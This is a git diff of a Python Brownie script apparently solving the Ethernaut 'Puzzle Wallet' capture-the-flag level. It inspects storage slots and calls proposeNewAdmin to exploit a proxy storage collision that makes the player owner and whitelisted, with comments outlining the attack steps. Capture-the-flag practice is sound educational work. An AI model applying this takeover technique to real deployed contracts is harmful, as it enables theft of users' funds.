@@ -1,18 +1,18 @@
 from re import A
 from scripts.helpful_scripts import get_account
-from brownie import web3, network, interface, convert, Attack24
+from brownie import web3, network, interface, convert, Attack24, PuzzleWallet, PuzzleProxy, Contract
 from eth_utils import keccak
 
-ETHERNAUT_INSTANCE = "0x5e6a96aC38aFeDA2E16838FfA5E98791b331621E"
+ETHERNAUT_INSTANCE = "0x3658a8587DfC8f840a415C39099AEE91FB410c4E"
 
 GAS_LIMIT = 12000000
 
 
-def proxy_balance():
+def contract_total_balance():
      # current balance of PuzzleProxy
     balance = web3.eth.getBalance(ETHERNAUT_INSTANCE)
     balance_eth = web3.fromWei(balance, "ether")
-    print(f"\nbalance in wei = {balance}\nbalance in ether = {balance_eth}\n")
+    print(f"\nContract total balance in wei = {balance}\nbalance in ether = {balance_eth}\n")
 
 
 def print_status():
@@ -20,13 +20,19 @@ def print_status():
     for i in range(2):
         storage_slot = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, i)
         storage_slot_hex = web3.toHex(storage_slot)
-        print(f"storage slot {i}:  {storage_slot_hex}")         # slot 0 / slot 1
-    slot_2 = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, 2)       # slot 2
+        print(f"storage slot {i}:  {storage_slot_hex}")         # slot 0/slot 1 --> (proxy) admin addresses
+
+    slot_2 = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, 2)       # slot 2    --> whitelist first
     slot_2_bool = bool(slot_2)
-    print(f"storage slot 2:  {slot_2_bool}")
-    slot_3 = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, 3)       # slot 3 
-    slot_3_unint = int.from_bytes(slot_3, "big", signed="False")
-    print(f"storage slot 3:  {slot_3_unint}")
+    print(f"storage slot 2:  {slot_2}")
+
+    slot_3 = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, 3)       # slot 3    --> whitelist second
+    slot_3_bool = bool(slot_3)
+    print(f"storage slot 3:  {slot_3}")
+
+    slot_4 = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, 4)       # slot 4
+    slot_4_uint = int.from_bytes(slot_4, "big", signed="False")
+    print(f"storage slot 4:  {slot_4}")
 
     # need 2 whitelisted address... make that work 'Address0 WL'
     
@@ -55,14 +61,22 @@ def print_status():
 
 def main():
     player = get_account()
+    print(f"\nplayer address = {player}")
     target = interface.IPuzzleWallet(ETHERNAUT_INSTANCE)
+
+    proxy_address = ETHERNAUT_INSTANCE
+    proxy = Contract.from_abi(PuzzleProxy._name, proxy_address, PuzzleProxy.abi)
+    print(f"Proxy address = {proxy_address}")
+    print(f"Proxy.admin() = {proxy.admin()}")
+
+
     # attack = Attack24.deploy({"from": player})
-    # proxy_balance()
+   
+    # contract_total_balance()
     print_status()
-    
-    interface.proposeNewAdmin(player) # <-- use the collision
-    interface.addToWhitelist(player)
-    
+    target.proposeNewAdmin(player, {"from": player})   
+    print_status()
+    target.addToWhitList(player, {"from": player})
     print_status()
 
 
@@ -71,10 +85,10 @@ def main():
 
     storage slot 0 has a collision - pendingAdmin and owner share the same slot
 
-    1. set pendingAdmin by calling --> proposeNewAdmin(player)
+    1. set pendingAdmin to player address
 
     2. now: owner == address(player)
-    
+
     3. call addToWhiteList(player)
 
     4. player is now 'white listed'
